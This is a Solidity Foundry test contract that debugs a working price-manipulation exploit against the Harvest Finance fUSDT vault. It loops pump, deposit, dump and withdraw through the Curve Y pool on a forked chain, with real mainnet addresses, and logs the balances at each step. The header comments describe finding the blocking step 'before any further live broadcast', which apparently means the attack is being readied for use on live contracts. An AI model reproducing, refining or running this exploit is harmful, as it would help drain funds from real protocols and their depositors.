// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IERC20LikeA6 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ICurveYPoolA6 {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external;
}

interface IHVaultA6 {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function balanceOf(address account) external view returns (uint256);
}

/// @title Harvest Attempt 6
/// @notice Pinpoints where the depleted-state Curve/Harvest loop now fails.
/// @dev Hypothesis: the post-drain live fork still has a valid exploit path, but one specific
///      sub-step inside `pump -> deposit -> dump -> withdraw` is now the blocker and needs
///      to be identified before any further live broadcast.
contract Attempt6 is Test {
    ICurveYPoolA6 internal constant CURVE_YPOOL = ICurveYPoolA6(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    IHVaultA6 internal constant FUSDT_VAULT = IHVaultA6(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);

    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    int128 internal constant IDX_USDC = 1;
    int128 internal constant IDX_USDT = 2;

    function setUp() public {
        vm.createSelectFork("ch2");

        _forceApprove(USDC, address(CURVE_YPOOL), type(uint256).max);
        _forceApprove(USDT, address(CURVE_YPOOL), type(uint256).max);
        _forceApprove(USDT, address(FUSDT_VAULT), type(uint256).max);
    }

    function test_debug_selected_loop() public {
        uint256 swapSize = vm.envUint("HARVEST_TEST_SWAP_SIZE");
        uint256 iterations = vm.envUint("HARVEST_TEST_ITERATIONS");
        uint256 usdtReserve = vm.envUint("HARVEST_TEST_USDT_RESERVE");

        deal(USDC, address(this), swapSize);
        deal(USDT, address(this), usdtReserve);

        console.log("DEBUG_SWAP_SIZE:", swapSize);
        console.log("DEBUG_ITERATIONS:", iterations);
        console.log("DEBUG_USDT_RESERVE:", usdtReserve);

        for (uint256 i; i < iterations; ++i) {
            console.log("ITERATION_INDEX:", i + 1);
            console.log("USDC_BEFORE:", IERC20LikeA6(USDC).balanceOf(address(this)));
            console.log("USDT_BEFORE:", IERC20LikeA6(USDT).balanceOf(address(this)));

            (bool okPump,) = address(CURVE_YPOOL).call(
                abi.encodeWithSelector(ICurveYPoolA6.exchange_underlying.selector, IDX_USDC, IDX_USDT, swapSize, 0)
            );
            console.log("PUMP_OK:", okPump);
            if (!okPump) {
                return;
            }

            uint256 pumpedUsdt = IERC20LikeA6(USDT).balanceOf(address(this)) - usdtReserve;
            console.log("PUMPED_USDT_DELTA:", pumpedUsdt);

            (bool okDeposit,) = address(FUSDT_VAULT).call(
                abi.encodeWithSelector(IHVaultA6.deposit.selector, pumpedUsdt)
            );
            console.log("DEPOSIT_OK:", okDeposit);
            if (!okDeposit) {
                return;
            }

            console.log("SHARES_AFTER_DEPOSIT:", FUSDT_VAULT.balanceOf(address(this)));
            console.log("USDT_AFTER_DEPOSIT:", IERC20LikeA6(USDT).balanceOf(address(this)));

            (bool okDump,) = address(CURVE_YPOOL).call(
                abi.encodeWithSelector(ICurveYPoolA6.exchange_underlying.selector, IDX_USDT, IDX_USDC, swapSize, 0)
            );
            console.log("DUMP_OK:", okDump);
            if (!okDump) {
                return;
            }

            uint256 shares = FUSDT_VAULT.balanceOf(address(this));
            (bool okWithdraw,) = address(FUSDT_VAULT).call(
                abi.encodeWithSelector(IHVaultA6.withdraw.selector, shares)
            );
            console.log("WITHDRAW_OK:", okWithdraw);
            if (!okWithdraw) {
                return;
            }

            usdtReserve = IERC20LikeA6(USDT).balanceOf(address(this));
            console.log("USDC_AFTER_WITHDRAW:", IERC20LikeA6(USDC).balanceOf(address(this)));
            console.log("USDT_AFTER_WITHDRAW:", usdtReserve);
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20LikeA6.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20LikeA6.approve.selector, spender, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool ok, bytes memory ret) = token.call(data);
        require(ok, "erc20 call failed");

        if (ret.length > 0) {
            require(abi.decode(ret, (bool)), "erc20 call false");
        }
    }
}
